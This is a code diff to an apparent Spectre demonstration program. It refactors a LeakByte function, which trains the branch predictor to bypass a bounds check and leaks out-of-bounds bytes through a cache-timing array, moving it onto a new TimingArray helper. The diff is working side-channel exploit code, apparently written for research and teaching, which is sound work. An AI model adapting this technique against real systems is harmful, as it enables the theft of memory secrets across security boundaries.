@@ -10,10 +10,11 @@
 #include <array>
 #include <cstring>
 #include <iostream>
+#include <memory>
 
-#include "cache_sidechannel.h"
 #include "instr.h"
 #include "local_content.h"
+#include "timing_array.h"
 #include "utils.h"
 
 // Leaks the byte that is physically located at &text[0] + offset, without ever
@@ -25,8 +26,7 @@
 // execution, bypassing the bounds check by training the branch predictor to
 // think that the value will be in-range.
 static char LeakByte(const char *data, size_t offset) {
-  CacheSideChannel sidechannel;
-  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();
+  TimingArray timing_array;
   // The size needs to be unloaded from cache to force speculative execution
   // to guess the result of comparison.
   //
@@ -36,7 +36,7 @@ static char LeakByte(const char *data, size_t offset) {
       new size_t(strlen(data)));
 
   for (int run = 0;; ++run) {
-    sidechannel.FlushOracle();
+    timing_array.FlushFromCache();
     // We pick a different offset every time so that it's guaranteed that the
     // value of the in-bounds access is usually different from the secret value
     // we want to leak via out-of-bounds speculative access.
@@ -66,19 +66,17 @@ static char LeakByte(const char *data, size_t offset) {
         // This branch was trained to always be taken during speculative
         // execution, so it's taken even on the 2048th iteration, when the
         // condition is false!
-        ForceRead(oracle.data() + static_cast<size_t>(
-            data[local_offset]));
+        ForceRead(&timing_array[data[local_offset]]);
       }
     }
 
-    std::pair<bool, char> result =
-        sidechannel.RecomputeScores(data[safe_offset]);
-    if (result.first) {
-      return result.second;
+    int ret = timing_array.FindFirstCachedElementIndexAfter(data[safe_offset]);
+    if (ret >= 0 && ret != data[safe_offset]) {
+      return ret;
     }
 
     if (run > 100000) {
-      std::cerr << "Does not converge " << result.second << std::endl;
+      std::cerr << "Does not converge" << std::endl;
       exit(EXIT_FAILURE);
     }
   }
